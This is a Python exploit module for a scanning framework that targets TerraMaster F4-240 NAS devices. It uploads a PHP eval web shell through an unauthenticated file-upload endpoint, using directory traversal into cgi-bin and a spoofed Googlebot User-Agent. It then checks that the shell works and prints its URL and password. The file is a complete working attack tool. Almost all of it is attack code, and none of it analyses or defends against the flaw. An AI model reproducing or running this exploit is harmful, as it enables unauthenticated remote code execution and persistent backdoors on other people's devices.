#! /usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import time

#模块使用说明
docs = '''

#title              : TerraMaster getshell exploit NASF4-240 RCE
#date               : 20150507
# Exploit           : Unauthenticated RCE as root.
# Vendor            : TerraMaster
# Author            : 独自等待
#python_version     : 2.7.5

'''

from modules.exploit import BGExploit
from api.pl_os_operation import pl_get_name
from thirdparty import requests

class PLScan(BGExploit):
    
    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "NASF4-240",  # 该POC的名称
            "product": "NASF4-240",  # 该POC所针对的应用名称,
            "product_version": "2.0",  # 应用的版本号
            "desc": '''
                TerraMaster getshell exploit
            ''',  # 该POC的描述
            "author": ["mosin"],  # 编写POC者
            "ref": [
                {self.ref.url: ""},  # 引用的url
                {self.ref.bugfrom: "http://www.waitalone.cn"},  # 漏洞出处
            ],
            "type": self.type.file_upload,  # 漏洞类型
            "severity": self.severity.high,  # 漏洞等级
            "privileged": False,  # 是否需要登录
            "disclosure_date": "2015-03-10",  # 漏洞公开时间
            "create_date": "2017-10-29",  # POC 创建时间
        }

        #自定义显示参数
        self.register_option({
            "target": {
                "default": "",
                "convert": self.convert.str_field,
                "desc": "目标URL",
                "Required":"no"
            },
            "port": {
                "default": "",
                "convert": self.convert.int_field,
                "desc": "目标端口",
                "Required":""
            },
            "debug": {
                "default": "",
                "convert": self.convert.str_field,
                "desc": "用于调试，排查poc中的问题",
                "Required":""
            },
            "mode": {
                "default": "exploit",
                "convert": self.convert.str_field,
                "desc": "执行exploit,或者执行payload",
                "Required":""
            }
        })
        
        #自定义返回内容
        self.register_result({
            #检测标志位，成功返回置为True,失败返回False
            "status": False,
            "exp_status":False, #exploit，攻击标志位，成功返回置为True,失败返回False
            #定义返回的数据，用于打印获取到的信息
            "data": {

            },
            #程序返回信息
            "description": "",
            "error": ""
        })
    def getshell(self,url):
        '''
        TerraMaster 文件上传GetShell函数
        :param url:  TerraMaster url地址
        :return:     返回得到的shell地址
        '''
        exp_url = url + 'include/upload.php?targetDir=../cgi-bin/filemanage/'
        headers = {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}
        filename = 'safe.php'
        with open(filename, 'wb') as fp:
            fp.write('<?php @eval($_POST[mosin]);?>')
        files = {
            'Filename': (None, filename),
            'name': (None, filename),
            'chunk': (None, '0'),
            'chunks': (None, '1'),
            'file': (filename, open(filename, 'rb'), 'application/octet-stream'),
            'Upload': (None, '给老子上!')
        }
        try:
            requests.post(exp_url, files=files, headers=headers)
            shell = url + 'cgi-bin/filemanage/' + filename
            reqcode = requests.get(shell, headers=headers).status_code
        except Exception, msg:
            print '\n[x] ERROR!!!:', msg
        else:
            if reqcode == 200: return shell


    def payload(self):
        """
        检测类型
        :return:
        """
        pass

    def exploit(self):
        url = self.option.target['default']
        start = time.time()
        if url[-1] != '/': url += '/'
        ok = self.getshell(url)
        try:
            os.remove('safe.php')
        except Exception:
            print '\n[x] 删除临时文件失败,请手工删除!'
        if ok:
            print '\n[!] 爷,人品暴发了，成功得到Shell：\n\n%s 密码：%s' % (ok, 'mosin')
        else:
            print '\n[x] 报告大爷,本站不存在此漏洞!'
        print '\n报告爷,脚本执行完毕,用时:', time.time() - start, '秒!'



#下面为单框架程序执行，可以省略
if __name__ == '__main__':
    from main import main
    main(PLScan())
